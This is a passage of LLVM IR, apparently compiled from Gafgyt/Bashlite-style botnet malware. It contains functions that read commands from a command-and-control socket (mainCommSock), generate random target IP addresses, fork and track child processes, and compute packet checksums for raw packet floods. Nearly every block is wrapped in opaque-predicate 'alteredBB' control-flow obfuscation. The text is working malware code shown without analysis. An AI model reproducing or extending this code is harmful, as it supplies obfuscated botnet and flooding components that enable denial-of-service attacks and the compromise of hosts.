  %_14 = shl i1 %66, true
  %_15 = sub i1 false, %66
  %gen16 = add i1 %_15, true
  %145 = xor i1 %66, true
  %146 = zext i1 %145 to i32
  store i32 %146, i32* %3, align 4
  br label %originalBB6

originalBB20alteredBB:                            ; preds = %originalBB20, %90
  %147 = load i8*, i8** %4, align 8
  %148 = getelementptr inbounds i8, i8* %147, i64 1
  %149 = load i8*, i8** %5, align 8
  %150 = getelementptr inbounds i8, i8* %149, i64 1
  %151 = call i32 @wildString(i8* %148, i8* %150)
  %152 = icmp ne i32 %151, 0
  %_21 = sub i1 false, %152
  %gen22 = add i1 %_21, true
  %_23 = shl i1 %152, true
  %_24 = sub i1 %152, true
  %gen25 = mul i1 %_24, true
  %_26 = sub i1 %152, true
  %gen27 = mul i1 %_26, true
  %_28 = shl i1 %152, true
  %_29 = shl i1 %152, true
  %153 = xor i1 %152, true
  br label %originalBB20
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = load i32, i32* @x.33
  %3 = load i32, i32* @y.34
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  store i8* %0, i8** %10, align 8
  %11 = load i32, i32* @x.33
  %12 = load i32, i32* @y.34
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %19

; <label>:19:                                     ; preds = %39, %originalBBpart2
  %20 = load i32, i32* @x.33
  %21 = load i32, i32* @y.34
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %19
  %28 = load i8*, i8** %10, align 8
  %29 = load i8, i8* %28, align 1
  %30 = icmp ne i8 %29, 0
  %31 = load i32, i32* @x.33
  %32 = load i32, i32* @y.34
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %30, label %39, label %48

; <label>:39:                                     ; preds = %originalBBpart24
  %40 = load i8*, i8** %10, align 8
  %41 = load i8, i8* %40, align 1
  %42 = zext i8 %41 to i32
  %43 = call i32 @toupper(i32 %42) #10
  %44 = trunc i32 %43 to i8
  %45 = load i8*, i8** %10, align 8
  store i8 %44, i8* %45, align 1
  %46 = load i8*, i8** %10, align 8
  %47 = getelementptr inbounds i8, i8* %46, i32 1
  store i8* %47, i8** %10, align 8
  br label %19

; <label>:48:                                     ; preds = %originalBBpart24
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %49 = alloca i8*, align 8
  store i8* %0, i8** %49, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %19
  %50 = load i8*, i8** %10, align 8
  %51 = load i8, i8* %50, align 1
  %52 = icmp ne i8 %51, 0
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define void @RandString(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %originalBBpart223, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %54

; <label>:10:                                     ; preds = %6
  %11 = load i32, i32* @x.35
  %12 = load i32, i32* @y.36
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = call i32 @rand_cmwc()
  %20 = urem i32 %19, 26
  %21 = add i32 %20, 65
  %22 = trunc i32 %21 to i8
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  store i8 %22, i8* %26, align 1
  %27 = load i32, i32* @x.35
  %28 = load i32, i32* @y.36
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %35

; <label>:35:                                     ; preds = %originalBBpart2
  %36 = load i32, i32* @x.35
  %37 = load i32, i32* @y.36
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBB8, label %originalBB8alteredBB

originalBB8:                                      ; preds = %originalBB8alteredBB, %35
  %44 = load i32, i32* %5, align 4
  %45 = add nsw i32 %44, 1
  store i32 %45, i32* %5, align 4
  %46 = load i32, i32* @x.35
  %47 = load i32, i32* @y.36
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart223, label %originalBB8alteredBB

originalBBpart223:                                ; preds = %originalBB8
  br label %6

; <label>:54:                                     ; preds = %6
  %55 = load i32, i32* @x.35
  %56 = load i32, i32* @y.36
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %54
  %63 = load i32, i32* @x.35
  %64 = load i32, i32* @y.36
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %10
  %71 = call i32 @rand_cmwc()
  %_ = sub i32 0, %71
  %gen = add i32 %_, 26
  %_1 = sub i32 0, %71
  %gen2 = add i32 %_1, 26
  %72 = urem i32 %71, 26
  %_3 = shl i32 %72, 65
  %_4 = sub i32 0, %72
  %gen5 = add i32 %_4, 65
  %_6 = sub i32 %72, 65
  %gen7 = mul i32 %_6, 65
  %73 = add i32 %72, 65
  %74 = trunc i32 %73 to i8
  %75 = load i8*, i8** %3, align 8
  %76 = load i32, i32* %5, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  store i8 %74, i8* %78, align 1
  br label %originalBB

originalBB8alteredBB:                             ; preds = %originalBB8, %35
  %79 = load i32, i32* %5, align 4
  %_9 = sub i32 0, %79
  %gen10 = add i32 %_9, 1
  %_11 = sub i32 %79, 1
  %gen12 = mul i32 %_11, 1
  %_13 = sub i32 0, %79
  %gen14 = add i32 %_13, 1
  %_15 = sub i32 0, %79
  %gen16 = add i32 %_15, 1
  %_17 = sub i32 %79, 1
  %gen18 = mul i32 %_17, 1
  %_19 = sub i32 %79, 1
  %gen20 = mul i32 %_19, 1
  %_21 = shl i32 %79, 1
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %5, align 4
  br label %originalBB8

originalBB25alteredBB:                            ; preds = %originalBB25, %54
  br label %originalBB25
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = load i32, i32* @x.37
  %5 = load i32, i32* @y.38
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca %struct.__sigset_t, align 8
  %17 = alloca %struct.timeval, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8, align 1
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  store i32 %0, i32* %13, align 4
  store i8* %1, i8** %14, align 8
  store i32 %2, i32* %15, align 4
  %27 = load i8*, i8** %14, align 8
  %28 = load i32, i32* %15, align 4
  %29 = sext i32 %28 to i64
  call void @llvm.memset.p0i8.i64(i8* %27, i8 0, i64 %29, i32 1, i1 false)
  %30 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 0
  store i64 30, i64* %30, align 8
  %31 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 1
  store i64 0, i64* %31, align 8
  %32 = load i32, i32* @x.37
  %33 = load i32, i32* @y.38
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %40

; <label>:40:                                     ; preds = %originalBBpart2
  %41 = load i32, i32* @x.37
  %42 = load i32, i32* @y.38
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %40
  %49 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %16, i32 0, i32 0
  %50 = getelementptr inbounds [16 x i64], [16 x i64]* %49, i64 0, i64 0
  %51 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %50) #2, !srcloc !2
  %52 = extractvalue { i64, i64* } %51, 0
  %53 = extractvalue { i64, i64* } %51, 1
  %54 = trunc i64 %52 to i32
  store i32 %54, i32* %18, align 4
  %55 = ptrtoint i64* %53 to i64
  %56 = trunc i64 %55 to i32
  store i32 %56, i32* %19, align 4
  %57 = load i32, i32* @x.37
  %58 = load i32, i32* @y.38
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %65

; <label>:65:                                     ; preds = %originalBBpart24
  %66 = load i32, i32* %13, align 4
  %67 = srem i32 %66, 64
  %68 = zext i32 %67 to i64
  %69 = shl i64 1, %68
  %70 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %16, i32 0, i32 0
  %71 = load i32, i32* %13, align 4
  %72 = sdiv i32 %71, 64
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds [16 x i64], [16 x i64]* %70, i64 0, i64 %73
  %75 = load i64, i64* %74, align 8
  %76 = or i64 %75, %69
  store i64 %76, i64* %74, align 8
  %77 = load i32, i32* %13, align 4
  %78 = add nsw i32 %77, 1
  %79 = call i32 @select(i32 %78, %struct.__sigset_t* %16, %struct.__sigset_t* null, %struct.__sigset_t* %16, %struct.timeval* %17)
  store i32 %79, i32* %20, align 4
  %80 = icmp sle i32 %79, 0
  br i1 %80, label %81, label %136

; <label>:81:                                     ; preds = %65
  %82 = load i32, i32* @x.37
  %83 = load i32, i32* @y.38
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %81
  %90 = load i32, i32* @x.37
  %91 = load i32, i32* @y.38
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %98

; <label>:98:                                     ; preds = %131, %originalBBpart28
  %99 = load i32, i32* %21, align 4
  %100 = icmp slt i32 %99, 10
  br i1 %100, label %101, label %135

; <label>:101:                                    ; preds = %98
  %102 = load i32, i32* @mainCommSock, align 4
  %103 = call i32 (i32, i8*, ...) @sockprintf(i32 %102, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i32 0, i32 0))
  %104 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 0
  store i64 30, i64* %104, align 8
  %105 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 1
  store i64 0, i64* %105, align 8
  br label %106

; <label>:106:                                    ; preds = %101
  %107 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %16, i32 0, i32 0
  %108 = getelementptr inbounds [16 x i64], [16 x i64]* %107, i64 0, i64 0
  %109 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %108) #2, !srcloc !3
  %110 = extractvalue { i64, i64* } %109, 0
  %111 = extractvalue { i64, i64* } %109, 1
  %112 = trunc i64 %110 to i32
  store i32 %112, i32* %22, align 4
  %113 = ptrtoint i64* %111 to i64
  %114 = trunc i64 %113 to i32
  store i32 %114, i32* %23, align 4
  br label %115

; <label>:115:                                    ; preds = %106
  %116 = load i32, i32* %13, align 4
  %117 = srem i32 %116, 64
  %118 = zext i32 %117 to i64
  %119 = shl i64 1, %118
  %120 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %16, i32 0, i32 0
  %121 = load i32, i32* %13, align 4
  %122 = sdiv i32 %121, 64
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds [16 x i64], [16 x i64]* %120, i64 0, i64 %123
  %125 = load i64, i64* %124, align 8
  %126 = or i64 %125, %119
  store i64 %126, i64* %124, align 8
  %127 = load i32, i32* %13, align 4
  %128 = add nsw i32 %127, 1
  %129 = call i32 @select(i32 %128, %struct.__sigset_t* %16, %struct.__sigset_t* null, %struct.__sigset_t* %16, %struct.timeval* %17)
  store i32 %129, i32* %20, align 4
  %130 = icmp sle i32 %129, 0
  br i1 %130, label %131, label %134

; <label>:131:                                    ; preds = %115
  %132 = load i32, i32* %21, align 4
  %133 = add nsw i32 %132, 1
  store i32 %133, i32* %21, align 4
  br label %98

; <label>:134:                                    ; preds = %115
  br label %135

; <label>:135:                                    ; preds = %134, %98
  br label %136

; <label>:136:                                    ; preds = %135, %65
  store i32 0, i32* %26, align 4
  %137 = load i8*, i8** %14, align 8
  store i8* %137, i8** %25, align 8
  br label %138

; <label>:138:                                    ; preds = %172, %136
  %139 = load i32, i32* %15, align 4
  %140 = add nsw i32 %139, -1
  store i32 %140, i32* %15, align 4
  %141 = icmp sgt i32 %139, 1
  br i1 %141, label %142, label %175

; <label>:142:                                    ; preds = %138
  %143 = load i32, i32* @mainCommSock, align 4
  %144 = call i64 @recv(i32 %143, i8* %24, i64 1, i32 0)
  %145 = icmp ne i64 %144, 1
  br i1 %145, label %146, label %148

; <label>:146:                                    ; preds = %142
  %147 = load i8*, i8** %25, align 8
  store i8 0, i8* %147, align 1
  store i32 -1, i32* %12, align 4
  br label %178

; <label>:148:                                    ; preds = %142
  %149 = load i8, i8* %24, align 1
  %150 = load i8*, i8** %25, align 8
  %151 = getelementptr inbounds i8, i8* %150, i32 1
  store i8* %151, i8** %25, align 8
  store i8 %149, i8* %150, align 1
  %152 = load i8, i8* %24, align 1
  %153 = zext i8 %152 to i32
  %154 = icmp eq i32 %153, 10
  br i1 %154, label %155, label %172

; <label>:155:                                    ; preds = %148
  %156 = load i32, i32* @x.37
  %157 = load i32, i32* @y.38
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %155
  %164 = load i32, i32* @x.37
  %165 = load i32, i32* @y.38
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %175

; <label>:172:                                    ; preds = %148
  %173 = load i32, i32* %26, align 4
  %174 = add nsw i32 %173, 1
  store i32 %174, i32* %26, align 4
  br label %138

; <label>:175:                                    ; preds = %originalBBpart212, %138
  %176 = load i8*, i8** %25, align 8
  store i8 0, i8* %176, align 1
  %177 = load i32, i32* %26, align 4
  store i32 %177, i32* %12, align 4
  br label %178

; <label>:178:                                    ; preds = %175, %146
  %179 = load i32, i32* @x.37
  %180 = load i32, i32* @y.38
  %181 = sub i32 %179, 1
  %182 = mul i32 %179, %181
  %183 = urem i32 %182, 2
  %184 = icmp eq i32 %183, 0
  %185 = icmp slt i32 %180, 10
  %186 = or i1 %184, %185
  br i1 %186, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %178
  %187 = load i32, i32* %12, align 4
  %188 = load i32, i32* @x.37
  %189 = load i32, i32* @y.38
  %190 = sub i32 %188, 1
  %191 = mul i32 %188, %190
  %192 = urem i32 %191, 2
  %193 = icmp eq i32 %192, 0
  %194 = icmp slt i32 %189, 10
  %195 = or i1 %193, %194
  br i1 %195, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  ret i32 %187

originalBBalteredBB:                              ; preds = %originalBB, %3
  %196 = alloca i32, align 4
  %197 = alloca i32, align 4
  %198 = alloca i8*, align 8
  %199 = alloca i32, align 4
  %200 = alloca %struct.__sigset_t, align 8
  %201 = alloca %struct.timeval, align 8
  %202 = alloca i32, align 4
  %203 = alloca i32, align 4
  %204 = alloca i32, align 4
  %205 = alloca i32, align 4
  %206 = alloca i32, align 4
  %207 = alloca i32, align 4
  %208 = alloca i8, align 1
  %209 = alloca i8*, align 8
  %210 = alloca i32, align 4
  store i32 %0, i32* %197, align 4
  store i8* %1, i8** %198, align 8
  store i32 %2, i32* %199, align 4
  %211 = load i8*, i8** %198, align 8
  %212 = load i32, i32* %199, align 4
  %213 = sext i32 %212 to i64
  call void @llvm.memset.p0i8.i64(i8* %211, i8 0, i64 %213, i32 1, i1 false)
  %214 = getelementptr inbounds %struct.timeval, %struct.timeval* %201, i32 0, i32 0
  store i64 30, i64* %214, align 8
  %215 = getelementptr inbounds %struct.timeval, %struct.timeval* %201, i32 0, i32 1
  store i64 0, i64* %215, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %40
  %216 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %16, i32 0, i32 0
  %217 = getelementptr inbounds [16 x i64], [16 x i64]* %216, i64 0, i64 0
  %218 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %217) #2, !srcloc !2
  %219 = extractvalue { i64, i64* } %218, 0
  %220 = extractvalue { i64, i64* } %218, 1
  %221 = trunc i64 %219 to i32
  store i32 %221, i32* %18, align 4
  %222 = ptrtoint i64* %220 to i64
  %223 = trunc i64 %222 to i32
  store i32 %223, i32* %19, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %81
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %155
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %178
  %224 = load i32, i32* %12, align 4
  br label %originalBB14
}

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %47

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 1
  store i64 %12, i64* @numpids, align 8
  %13 = load i64, i64* @numpids, align 8
  %14 = add i64 %13, 1
  %15 = mul i64 %14, 4
  %16 = call noalias i8* @malloc(i64 %15) #2
  %17 = bitcast i8* %16 to i32*
  store i32* %17, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %18

; <label>:18:                                     ; preds = %34, %10
  %19 = load i32, i32* %4, align 4
  %20 = zext i32 %19 to i64
  %21 = load i64, i64* @numpids, align 8
  %22 = sub i64 %21, 1
  %23 = icmp ult i64 %20, %22
  br i1 %23, label %24, label %37

; <label>:24:                                     ; preds = %18
  %25 = load i32*, i32** @pids, align 8
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds i32, i32* %25, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32*, i32** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = zext i32 %31 to i64
  %33 = getelementptr inbounds i32, i32* %30, i64 %32
  store i32 %29, i32* %33, align 4
  br label %34

; <label>:34:                                     ; preds = %24
  %35 = load i32, i32* %4, align 4
  %36 = add i32 %35, 1
  store i32 %36, i32* %4, align 4
  br label %18

; <label>:37:                                     ; preds = %18
  %38 = load i32, i32* %2, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i64, i64* @numpids, align 8
  %41 = sub i64 %40, 1
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  %43 = load i32*, i32** @pids, align 8
  %44 = bitcast i32* %43 to i8*
  call void @free(i8* %44) #2
  %45 = load i32*, i32** %3, align 8
  store i32* %45, i32** @pids, align 8
  %46 = load i32, i32* %2, align 4
  store i32 %46, i32* %1, align 4
  br label %47

; <label>:47:                                     ; preds = %37, %8
  %48 = load i32, i32* %1, align 4
  ret i32 %48
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @GetRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %originalBBpart2, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %34

; <label>:9:                                      ; preds = %6
  %10 = load i32, i32* @x.43
  %11 = load i32, i32* @y.44
  %12 = sub i32 %10, 1
  %13 = mul i32 %10, %12
  %14 = urem i32 %13, 2
  %15 = icmp eq i32 %14, 0
  %16 = icmp slt i32 %11, 10
  %17 = or i1 %15, %16
  br i1 %17, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %9
  %18 = load i16*, i16** %3, align 8
  %19 = getelementptr inbounds i16, i16* %18, i32 1
  store i16* %19, i16** %3, align 8
  %20 = load i16, i16* %18, align 2
  %21 = zext i16 %20 to i64
  %22 = load i64, i64* %5, align 8
  %23 = add i64 %22, %21
  store i64 %23, i64* %5, align 8
  %24 = load i32, i32* %4, align 4
  %25 = sub nsw i32 %24, 2
  store i32 %25, i32* %4, align 4
  %26 = load i32, i32* @x.43
  %27 = load i32, i32* @y.44
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %6

; <label>:34:                                     ; preds = %6
  %35 = load i32, i32* %4, align 4
  %36 = icmp sgt i32 %35, 0
  br i1 %36, label %37, label %60

; <label>:37:                                     ; preds = %34
  %38 = load i32, i32* @x.43
  %39 = load i32, i32* @y.44
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %37
  %46 = load i16*, i16** %3, align 8
  %47 = bitcast i16* %46 to i8*
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i64
  %50 = load i64, i64* %5, align 8
  %51 = add i64 %50, %49
  store i64 %51, i64* %5, align 8
  %52 = load i32, i32* @x.43
  %53 = load i32, i32* @y.44
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBBpart225, label %originalBB10alteredBB

originalBBpart225:                                ; preds = %originalBB10
  br label %60

; <label>:60:                                     ; preds = %originalBBpart225, %34
  br label %61

; <label>:61:                                     ; preds = %originalBBpart262, %60
  %62 = load i32, i32* @x.43
  %63 = load i32, i32* @y.44
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %61
  %70 = load i64, i64* %5, align 8
  %71 = lshr i64 %70, 16
  %72 = icmp ne i64 %71, 0
  %73 = load i32, i32* @x.43
  %74 = load i32, i32* @y.44
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBBpart235, label %originalBB27alteredBB

originalBBpart235:                                ; preds = %originalBB27
  br i1 %72, label %81, label %103

; <label>:81:                                     ; preds = %originalBBpart235
  %82 = load i32, i32* @x.43
  %83 = load i32, i32* @y.44
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %81
  %90 = load i64, i64* %5, align 8
  %91 = and i64 %90, 65535
  %92 = load i64, i64* %5, align 8
  %93 = lshr i64 %92, 16
  %94 = add i64 %91, %93
  store i64 %94, i64* %5, align 8
  %95 = load i32, i32* @x.43
  %96 = load i32, i32* @y.44
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBBpart262, label %originalBB37alteredBB

originalBBpart262:                                ; preds = %originalBB37
  br label %61

; <label>:103:                                    ; preds = %originalBBpart235
  %104 = load i64, i64* %5, align 8
  %105 = xor i64 %104, -1
  %106 = trunc i64 %105 to i16
  ret i16 %106

originalBBalteredBB:                              ; preds = %originalBB, %9
  %107 = load i16*, i16** %3, align 8
